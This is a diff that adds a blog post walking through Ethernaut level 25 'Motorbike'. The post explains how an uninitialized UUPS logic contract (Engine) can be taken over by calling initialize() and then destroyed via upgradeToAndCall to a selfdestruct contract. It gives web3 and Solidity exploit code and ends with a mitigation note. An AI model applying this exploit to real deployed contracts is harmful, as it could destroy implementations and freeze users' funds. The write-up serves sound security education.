@@ -1,0 +1,84 @@
+---
+title: Level 25 - Motorbike
+slug: level-25
+published: 06-09-2023
+lastEdited:
+imgSrc: /images/ethernaut/ethernaut25.svg
+---
+
+## Objectives
+
+1. Somehow `selfdestruct` the `Engine` contract.
+
+## Vulnerabilities
+
+1. Uninitialized initializable contracts
+
+Contract can be `Initializable` which is a way to implement core logic that a constructor would do. This functionality
+can be called only once. Having an `initialize` function in a contract that has not yet been called can present a critical vulnerability.
+
+## Exploit
+
+Contract `Motorbike` is a proxy. It executes logic located inside a _logic contract_ using `delegatecall`. This 
+is a very common pattern but comes with it's share of security concerns. In this case, the _logic contract_ is 
+the `Engine` contract.
+
+1. Let's find the address of the deployed `Engine` contract. It is stored at slot `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc`
+of `Motorbike`. Let's use the web3 library in the console.
+
+```javascript
+const addr = contract.address;
+const slotDec = BigInt('0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc').toString();
+const logicAddr = await web3.eth.getStorageAt(addr, slotDec);
+```
+
+2. Remove the first 12 bytes of zeroes leading `logicAddr` and we now have the contract address of `Engine`.
+
+3. Let's write and compile a small `IEngine` `interface` on Remix. Using the _At adrress_ field, paste the value 
+of `logicAddr`. This enables us to easily interact with it.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity <0.7.0;
+
+interface IEngine {
+    function upgrader() external view returns (address) ;
+    function initialize() external;
+    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
+}
+```
+
+4. Call `initialize()` from `IEngine`. We can call this function because it is actually not initialized. In `Motorbike`'s
+constructor, a `delegatecall` called `initialized` which executed the logic on the storage of `Motorbike`. Calling this
+function now makes us the `upgrader` of `Engine.
+
+5. Let's now write a deploy a hack contract like the following:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity <0.7.0;
+
+contract EngineHack {
+    function boom() external {
+        selfdestruct(address(0));
+    }
+}
+```
+6. The last step is to call `upgradeToAndCall` with our _hack contract_ address and the function signature of `boom()`. 
+We can find this signature using web3 in the console like this:
+
+```javascript
+const data = web3.eth.abi.encodeFunctionSignature("boom()");
+```
+
+Once `upgradeToAndCall` is called with the correct arguments, the Engine contract should have `selfdestruct`.
+
+
+## Suggested mitigation
+
+- Always verify that an *initializable* contract has actually been initialized.
+
+## Further reading
+
+- A blog post on UUPS vulnerability by OpenZeppelin <ExternalLink href={"https://forum.openzeppelin.com/t/uupsupgradeable-vulnerability-post-mortem/15680"} />
+
+- transparent vs UUPS proxies by OpenZeppelin <ExternalLink href={"https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups"} />
